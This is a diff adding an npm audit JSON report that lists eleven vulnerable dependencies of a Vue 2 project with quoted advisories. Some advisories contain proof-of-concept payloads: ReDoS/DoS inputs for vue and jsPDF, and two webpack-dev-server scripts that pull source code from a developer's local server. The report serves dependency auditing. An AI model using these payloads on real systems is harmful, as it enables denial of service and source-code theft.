@@ -1,0 +1,514 @@
+{
+    "actions": [
+        {
+            "action": "update",
+            "resolves": [
+                {
+                    "id": 1105772,
+                    "path": ".>jspdf>dompurify",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                }
+            ],
+            "module": null,
+            "target": null,
+            "depth": 3
+        },
+        {
+            "action": "review",
+            "module": "vue-template-compiler",
+            "resolves": [
+                {
+                    "id": 1098721,
+                    "path": ".>vue-template-compiler",
+                    "dev": false,
+                    "bundled": false,
+                    "optional": false
+                }
+            ]
+        },
+        {
+            "action": "review",
+            "module": "vue",
+            "resolves": [
+                {
+                    "id": 1100238,
+                    "path": ".>vue",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                }
+            ]
+        },
+        {
+            "action": "review",
+            "module": "jspdf",
+            "resolves": [
+                {
+                    "id": 1103308,
+                    "path": ".>jspdf",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                },
+                {
+                    "id": 1107412,
+                    "path": ".>jspdf",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                }
+            ]
+        },
+        {
+            "action": "review",
+            "module": "cross-spawn",
+            "resolves": [
+                {
+                    "id": 1104663,
+                    "path": ".>@vue/cli-plugin-eslint>yorkie>execa>cross-spawn",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                }
+            ]
+        },
+        {
+            "action": "review",
+            "module": "xlsx",
+            "resolves": [
+                {
+                    "id": 1108110,
+                    "path": ".>xlsx",
+                    "dev": false,
+                    "bundled": false,
+                    "optional": false
+                },
+                {
+                    "id": 1108111,
+                    "path": ".>xlsx",
+                    "dev": false,
+                    "bundled": false,
+                    "optional": false
+                }
+            ]
+        },
+        {
+            "action": "review",
+            "module": "webpack-dev-server",
+            "resolves": [
+                {
+                    "id": 1108429,
+                    "path": ".>@vue/cli-service>webpack-dev-server",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                },
+                {
+                    "id": 1108430,
+                    "path": ".>@vue/cli-service>webpack-dev-server",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                }
+            ]
+        },
+        {
+            "action": "review",
+            "module": "postcss",
+            "resolves": [
+                {
+                    "id": 1109574,
+                    "path": ".>@vue/cli-service>@vue/component-compiler-utils>postcss",
+                    "dev": false,
+                    "optional": false,
+                    "bundled": false
+                }
+            ]
+        }
+    ],
+    "advisories": {
+        "1098721": {
+            "findings": [
+                {
+                    "version": "2.7.16",
+                    "paths": [".>vue-template-compiler"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-6783\n- https://www.herodevs.com/vulnerability-directory/cve-2024-6783\n- https://github.com/advisories/GHSA-g3ch-rx76-35fx",
+            "created": "2024-07-23T15:31:09.000Z",
+            "id": 1098721,
+            "npm_advisory_id": null,
+            "overview": "A vulnerability has been discovered in vue-template-compiler, that allows an attacker to perform XSS via prototype pollution. The attacker could change the prototype chain of some properties such as `Object.prototype.staticClass` or `Object.prototype.staticStyle` to execute arbitrary JavaScript code. Vue 2 has reached End-of-Life. This vulnerability has been patched in Vue 3.",
+            "reported_by": null,
+            "title": "vue-template-compiler vulnerable to client-side Cross-Site Scripting (XSS)",
+            "metadata": null,
+            "cves": ["CVE-2024-6783"],
+            "access": "public",
+            "severity": "moderate",
+            "module_name": "vue-template-compiler",
+            "vulnerable_versions": ">=2.0.0 <3.0.0",
+            "github_advisory_id": "GHSA-g3ch-rx76-35fx",
+            "recommendation": "Upgrade to version 3.0.0 or later",
+            "patched_versions": ">=3.0.0",
+            "updated": "2024-08-30T15:45:16.000Z",
+            "cvss": {
+                "score": 4.2,
+                "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"
+            },
+            "cwe": ["CWE-79"],
+            "url": "https://github.com/advisories/GHSA-g3ch-rx76-35fx"
+        },
+        "1100238": {
+            "findings": [
+                {
+                    "version": "2.7.16",
+                    "paths": [".>vue"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-9506\n- https://www.herodevs.com/vulnerability-directory/cve-2024-9506\n- https://github.com/advisories/GHSA-5j4c-8p2g-v4jx",
+            "created": "2024-10-15T18:30:50.000Z",
+            "id": 1100238,
+            "npm_advisory_id": null,
+            "overview": "The ReDoS can be exploited through the `parseHTML` function in the `html-parser.ts` file. This flaw allows attackers to slow down the application by providing specially crafted input that causes inefficient processing of regular expressions, leading to excessive resource consumption.\n\nTo demonstrate this vulnerability, here's an example. In a Vue client-side application, create a new Vue instance with a template string that includes a `<script>` tag but closes it incorrectly with something like `</textarea>`.\n\n```javascript\nnew Vue({\n  el: '#app',\n  template: '\n    <div>\n      Hello, world!\n      <script>${'<'.repeat(1000000)}</textarea>\n    </div>'\n});\n```\nNext, set up a basic HTML page (e.g., index.html) to load this JavaScript and mount the Vue instance:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <title>My first Vue app</title>\n</head>\n<body>\n  <div id=\\\"app\\\">Loading...</div>\n</body>\n</html>\n```\n\nWhen you visit the app in your browser at http://localhost:3000, you'll notice that the time taken to parse and mount the Vue application increases significantly due to the ReDoS vulnerability, demonstrating how the flaw can affect performance.",
+            "reported_by": null,
+            "title": "ReDoS vulnerability in vue package that is exploitable through inefficient regex evaluation in the parseHTML function",
+            "metadata": null,
+            "cves": ["CVE-2024-9506"],
+            "access": "public",
+            "severity": "low",
+            "module_name": "vue",
+            "vulnerable_versions": ">=2.0.0-alpha.1 <3.0.0-alpha.0",
+            "github_advisory_id": "GHSA-5j4c-8p2g-v4jx",
+            "recommendation": "Upgrade to version 3.0.0-alpha.0 or later",
+            "patched_versions": ">=3.0.0-alpha.0",
+            "updated": "2024-10-24T20:05:37.000Z",
+            "cvss": {
+                "score": 3.7,
+                "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+            },
+            "cwe": ["CWE-1333"],
+            "url": "https://github.com/advisories/GHSA-5j4c-8p2g-v4jx"
+        },
+        "1103308": {
+            "findings": [
+                {
+                    "version": "2.5.2",
+                    "paths": [".>jspdf"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-w532-jxjh-hjhj\n- https://github.com/parallax/jsPDF/commit/b167c43c27c466eb914b927885b06073708338df\n- https://nvd.nist.gov/vuln/detail/CVE-2025-29907\n- https://github.com/advisories/GHSA-w532-jxjh-hjhj",
+            "created": "2025-03-18T21:07:47.000Z",
+            "id": 1103308,
+            "npm_advisory_id": null,
+            "overview": "### Impact\nUser control of the first argument of the `addImage` method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image urls to the `addImage` method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`, `addSvgAsImage`.\n\nExample payload:\n```js\nimport { jsPDF } from \"jpsdf\" \n\nconst doc = new jsPDF();\nconst payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=\\x00base64,undefined';\n\nconst startTime = performance.now()\n\ntry {\n doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} catch (err) {\n  const endTime = performance.now()\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)\n}\n\ndoc.save(\"a4.pdf\");\n```",
+            "reported_by": null,
+            "title": "jsPDF Bypass Regular Expression Denial of Service (ReDoS)",
+            "metadata": null,
+            "cves": ["CVE-2025-29907"],
+            "access": "public",
+            "severity": "high",
+            "module_name": "jspdf",
+            "vulnerable_versions": "<3.0.1",
+            "github_advisory_id": "GHSA-w532-jxjh-hjhj",
+            "recommendation": "Upgrade to version 3.0.1 or later",
+            "patched_versions": ">=3.0.1",
+            "updated": "2025-03-19T05:58:36.000Z",
+            "cvss": {
+                "score": 0,
+                "vectorString": null
+            },
+            "cwe": ["CWE-400", "CWE-770"],
+            "url": "https://github.com/advisories/GHSA-w532-jxjh-hjhj"
+        },
+        "1104663": {
+            "findings": [
+                {
+                    "version": "5.1.0",
+                    "paths": [
+                        ".>@vue/cli-plugin-eslint>yorkie>execa>cross-spawn"
+                    ]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-21538\n- https://github.com/moxystudio/node-cross-spawn/pull/160\n- https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff\n- https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f\n- https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230\n- https://github.com/moxystudio/node-cross-spawn/issues/165\n- https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349\n- https://github.com/advisories/GHSA-3xgq-45jj-v275",
+            "created": "2024-11-08T06:30:47.000Z",
+            "id": 1104663,
+            "npm_advisory_id": null,
+            "overview": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+            "reported_by": null,
+            "title": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
+            "metadata": null,
+            "cves": ["CVE-2024-21538"],
+            "access": "public",
+            "severity": "high",
+            "module_name": "cross-spawn",
+            "vulnerable_versions": "<6.0.6",
+            "github_advisory_id": "GHSA-3xgq-45jj-v275",
+            "recommendation": "Upgrade to version 6.0.6 or later",
+            "patched_versions": ">=6.0.6",
+            "updated": "2025-05-19T19:56:26.000Z",
+            "cvss": {
+                "score": 7.5,
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            },
+            "cwe": ["CWE-1333"],
+            "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
+        },
+        "1105772": {
+            "findings": [
+                {
+                    "version": "2.5.8",
+                    "paths": [".>jspdf>dompurify"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-26791\n- https://github.com/cure53/DOMPurify/commit/d18ffcb554e0001748865da03ac75dd7829f0f02\n- https://ensy.zip/posts/dompurify-323-bypass\n- https://github.com/cure53/DOMPurify/releases/tag/3.2.4\n- https://nsysean.github.io/posts/dompurify-323-bypass\n- https://github.com/advisories/GHSA-vhxf-7vqr-mrjg",
+            "created": "2025-02-14T09:31:22.000Z",
+            "id": 1105772,
+            "npm_advisory_id": null,
+            "overview": "DOMPurify before 3.2.4 has an incorrect template literal regular expression when SAFE_FOR_TEMPLATES is set to true, sometimes leading to mutation cross-site scripting (mXSS).",
+            "reported_by": null,
+            "title": "DOMPurify allows Cross-site Scripting (XSS)",
+            "metadata": null,
+            "cves": ["CVE-2025-26791"],
+            "access": "public",
+            "severity": "moderate",
+            "module_name": "dompurify",
+            "vulnerable_versions": "<3.2.4",
+            "github_advisory_id": "GHSA-vhxf-7vqr-mrjg",
+            "recommendation": "Upgrade to version 3.2.4 or later",
+            "patched_versions": ">=3.2.4",
+            "updated": "2025-06-30T14:24:15.000Z",
+            "cvss": {
+                "score": 4.5,
+                "vectorString": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N"
+            },
+            "cwe": ["CWE-79"],
+            "url": "https://github.com/advisories/GHSA-vhxf-7vqr-mrjg"
+        },
+        "1107412": {
+            "findings": [
+                {
+                    "version": "2.5.2",
+                    "paths": [".>jspdf"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://github.com/parallax/jsPDF/security/advisories/GHSA-8mvj-3j78-4qmw\n- https://github.com/parallax/jsPDF/commit/4cf3ab619e565d9b88b4b130bff901b91d8688e9\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57810\n- https://github.com/parallax/jsPDF/pull/3880\n- https://github.com/parallax/jsPDF/releases/tag/v3.0.2\n- https://github.com/advisories/GHSA-8mvj-3j78-4qmw",
+            "created": "2025-08-26T16:19:04.000Z",
+            "id": 1107412,
+            "npm_advisory_id": null,
+            "overview": "### Impact\nUser control of the first argument of the addImage method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image data or URLs to the addImage method, a user can provide a harmful PNG file that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`.\n\nExample payload:\n\n```js\nimport { jsPDF } from \"jspdf\" \n\nconst payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])\n\nconst doc = new jsPDF();\nconst startTime = performance.now();\ntry {\n  doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} finally {\n  const endTime = performance.now();\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`);\n}\n```",
+            "reported_by": null,
+            "title": "jsPDF Denial of Service (DoS)",
+            "metadata": null,
+            "cves": ["CVE-2025-57810"],
+            "access": "public",
+            "severity": "high",
+            "module_name": "jspdf",
+            "vulnerable_versions": "<=3.0.1",
+            "github_advisory_id": "GHSA-8mvj-3j78-4qmw",
+            "recommendation": "Upgrade to version 3.0.2 or later",
+            "patched_versions": ">=3.0.2",
+            "updated": "2025-09-10T21:07:05.000Z",
+            "cvss": {
+                "score": 7.5,
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            },
+            "cwe": ["CWE-20", "CWE-835"],
+            "url": "https://github.com/advisories/GHSA-8mvj-3j78-4qmw"
+        },
+        "1108110": {
+            "findings": [
+                {
+                    "version": "0.18.5",
+                    "paths": [".>xlsx"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-30533\n- https://cdn.sheetjs.com/advisories/CVE-2023-30533\n- https://git.sheetjs.com/sheetjs/sheetjs/src/branch/master/CHANGELOG.md\n- https://git.sheetjs.com/sheetjs/sheetjs/issues/2667\n- https://git.sheetjs.com/sheetjs/sheetjs/issues/2986\n- https://cdn.sheetjs.com\n- https://github.com/advisories/GHSA-4r6h-8v6p-xvw6",
+            "created": "2023-04-24T09:30:19.000Z",
+            "id": 1108110,
+            "npm_advisory_id": null,
+            "overview": "All versions of SheetJS CE through 0.19.2 are vulnerable to \"Prototype Pollution\" when reading specially crafted files. Workflows that do not read arbitrary files (for example, exporting data to spreadsheet files) are unaffected.\n\nA non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained. Version 0.19.3 can be downloaded via https://cdn.sheetjs.com/.",
+            "reported_by": null,
+            "title": "Prototype Pollution in sheetJS",
+            "metadata": null,
+            "cves": ["CVE-2023-30533"],
+            "access": "public",
+            "severity": "high",
+            "module_name": "xlsx",
+            "vulnerable_versions": "<0.19.3",
+            "github_advisory_id": "GHSA-4r6h-8v6p-xvw6",
+            "recommendation": "None",
+            "patched_versions": "<0.0.0",
+            "updated": "2025-09-19T15:23:41.000Z",
+            "cvss": {
+                "score": 7.8,
+                "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+            },
+            "cwe": ["CWE-1321"],
+            "url": "https://github.com/advisories/GHSA-4r6h-8v6p-xvw6"
+        },
+        "1108111": {
+            "findings": [
+                {
+                    "version": "0.18.5",
+                    "paths": [".>xlsx"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-22363\n- https://cdn.sheetjs.com/advisories/CVE-2024-22363\n- https://cwe.mitre.org/data/definitions/1333.html\n- https://git.sheetjs.com/sheetjs/sheetjs/src/tag/v0.20.2\n- https://cdn.sheetjs.com\n- https://github.com/advisories/GHSA-5pgg-2g8v-p4x9",
+            "created": "2024-04-05T06:30:46.000Z",
+            "id": 1108111,
+            "npm_advisory_id": null,
+            "overview": "SheetJS Community Edition before 0.20.2 is vulnerable.to Regular Expression Denial of Service (ReDoS).\n\nA non-vulnerable version cannot be found via npm, as the repository hosted on GitHub and the npm package `xlsx` are no longer maintained. Version 0.20.2 can be downloaded via https://cdn.sheetjs.com/.",
+            "reported_by": null,
+            "title": "SheetJS Regular Expression Denial of Service (ReDoS)",
+            "metadata": null,
+            "cves": ["CVE-2024-22363"],
+            "access": "public",
+            "severity": "high",
+            "module_name": "xlsx",
+            "vulnerable_versions": "<0.20.2",
+            "github_advisory_id": "GHSA-5pgg-2g8v-p4x9",
+            "recommendation": "None",
+            "patched_versions": "<0.0.0",
+            "updated": "2025-09-19T15:23:26.000Z",
+            "cvss": {
+                "score": 7.5,
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            },
+            "cwe": ["CWE-1333"],
+            "url": "https://github.com/advisories/GHSA-5pgg-2g8v-p4x9"
+        },
+        "1108429": {
+            "findings": [
+                {
+                    "version": "4.15.2",
+                    "paths": [".>@vue/cli-service>webpack-dev-server"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30360\n- https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb\n- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239\n- https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\n- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e\n- https://github.com/advisories/GHSA-9jgg-88mc-972h",
+            "created": "2025-06-04T21:09:47.000Z",
+            "id": 1108429,
+            "npm_advisory_id": null,
+            "overview": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```",
+            "reported_by": null,
+            "title": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
+            "metadata": null,
+            "cves": ["CVE-2025-30360"],
+            "access": "public",
+            "severity": "moderate",
+            "module_name": "webpack-dev-server",
+            "vulnerable_versions": "<=5.2.0",
+            "github_advisory_id": "GHSA-9jgg-88mc-972h",
+            "recommendation": "Upgrade to version 5.2.1 or later",
+            "patched_versions": ">=5.2.1",
+            "updated": "2025-10-03T13:25:56.000Z",
+            "cvss": {
+                "score": 6.5,
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+            },
+            "cwe": ["CWE-346"],
+            "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h"
+        },
+        "1108430": {
+            "findings": [
+                {
+                    "version": "4.15.2",
+                    "paths": [".>@vue/cli-service>webpack-dev-server"]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30359\n- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e\n- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239\n- https://github.com/advisories/GHSA-4v9v-hfq4-rm2v",
+            "created": "2025-06-04T21:09:13.000Z",
+            "id": 1108430,
+            "npm_advisory_id": null,
+            "overview": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```",
+            "reported_by": null,
+            "title": "webpack-dev-server users' source code may be stolen when they access a malicious web site",
+            "metadata": null,
+            "cves": ["CVE-2025-30359"],
+            "access": "public",
+            "severity": "moderate",
+            "module_name": "webpack-dev-server",
+            "vulnerable_versions": "<=5.2.0",
+            "github_advisory_id": "GHSA-4v9v-hfq4-rm2v",
+            "recommendation": "Upgrade to version 5.2.1 or later",
+            "patched_versions": ">=5.2.1",
+            "updated": "2025-10-03T13:25:41.000Z",
+            "cvss": {
+                "score": 5.3,
+                "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+            },
+            "cwe": ["CWE-749"],
+            "url": "https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"
+        },
+        "1109574": {
+            "findings": [
+                {
+                    "version": "7.0.39",
+                    "paths": [
+                        ".>@vue/cli-service>@vue/component-compiler-utils>postcss"
+                    ]
+                }
+            ],
+            "found_by": null,
+            "deleted": null,
+            "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-44270\n- https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5\n- https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25\n- https://github.com/postcss/postcss/releases/tag/8.4.31\n- https://github.com/github/advisory-database/issues/2820\n- https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html\n- https://github.com/advisories/GHSA-7fh5-64p2-3v2j",
+            "created": "2023-09-30T00:31:19.000Z",
+            "id": 1109574,
+            "npm_advisory_id": null,
+            "overview": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+            "reported_by": null,
+            "title": "PostCSS line return parsing error",
+            "metadata": null,
+            "cves": ["CVE-2023-44270"],
+            "access": "public",
+            "severity": "moderate",
+            "module_name": "postcss",
+            "vulnerable_versions": "<8.4.31",
+            "github_advisory_id": "GHSA-7fh5-64p2-3v2j",
+            "recommendation": "Upgrade to version 8.4.31 or later",
+            "patched_versions": ">=8.4.31",
+            "updated": "2025-11-04T16:45:03.000Z",
+            "cvss": {
+                "score": 5.3,
+                "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+            },
+            "cwe": ["CWE-74", "CWE-144"],
+            "url": "https://github.com/advisories/GHSA-7fh5-64p2-3v2j"
+        }
+    },
+    "muted": [],
+    "metadata": {
+        "vulnerabilities": {
+            "info": 0,
+            "low": 1,
+            "moderate": 5,
+            "high": 5,
+            "critical": 0
+        },
+        "dependencies": 1020,
+        "devDependencies": 0,
+        "optionalDependencies": 0,
+        "totalDependencies": 1020
+    }
+}
